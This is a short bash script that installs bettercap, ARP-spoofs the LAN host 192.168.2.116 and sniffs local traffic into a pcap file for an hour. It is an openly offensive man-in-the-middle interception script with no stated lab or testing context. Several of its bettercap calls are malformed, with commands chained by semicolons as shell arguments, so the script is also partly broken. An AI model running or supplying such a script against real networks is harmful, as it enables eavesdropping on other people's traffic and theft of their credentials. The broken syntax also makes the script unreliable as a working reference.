#!/bin/bash
set +x
mkdir data/bettercap

go install github.com/bettercap/bettercap@latest

bettercap caplets.update
bettercap set.arp.spoof.targets 192.168.2.116; arp.spoof on
bettercap set net.sniff.output /usr/src/app/snif.pcap; set net.sniff.local true
bettercap net.sniff on


sleep 60m
